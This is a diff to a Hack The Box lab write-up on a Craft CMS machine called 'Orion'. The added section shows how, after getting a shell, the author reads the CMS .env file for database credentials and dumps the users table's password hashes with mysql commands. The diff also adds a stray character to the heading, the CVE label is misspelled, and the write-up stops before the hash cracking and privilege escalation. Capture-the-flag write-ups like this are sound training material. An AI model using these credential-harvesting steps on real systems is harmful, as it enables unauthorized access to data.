@@ -1,4 +1,4 @@
-# Hack The Box Labs: Orion
+z# Hack The Box Labs: Orion
 
 This lab exploits Craft CMS version 5.6.16, the CSV-2025-32432 has a Base Score of 10.0.
 
@@ -78,11 +78,43 @@ Now that we've got a shell, lets see what network services are listening for con
 - Port 80 (nginx)
 - Port 3306 (MySQL) on 127.0.0.1
 
-We can now see new services, Telnet and MySQL, that we didnt see before with our nmap scan because they were not exposed to the outside world.
+We can now see new services, Telnet and MySQL, that we didnt see before with our nmap scan because they were not exposed to the outside world. Lets investigate them.
+
+If we try to run the mysql command, we'll be denided because of our username. So lets try to find a password.
+
+First look around in our starting directory, which leads us here:
+
+	cd html/craft/
+
+If we list all files, including the hidden ones, we'll find .env, which this file contains login credentials for mysql.
+
+	cat /var/www/html/craft/.env
+
+
+We can now use the mysql command. First lets enumerate the databases:
+
+	mysql -u root -p'SuperSecureCraft123Pass!' -e 'show databases;'
+
+Lets see whats in orion:
+
+	mysql -u root -p'SuperSecureCraft123Pass!' -e 'SHOW TABLES FROM orion;'
+
+Theres a users table. Lets access it:
+
+	mysql -u root -p'SuperSecureCraft123Pass!' -e "SELECT username, admin, email, password FROM orion.users;"
+
+Now we've got a hash, lets crack it. 
+
+
 
 
 
 # Privilege Escalation:
+
+
+
+
+
 
 
 
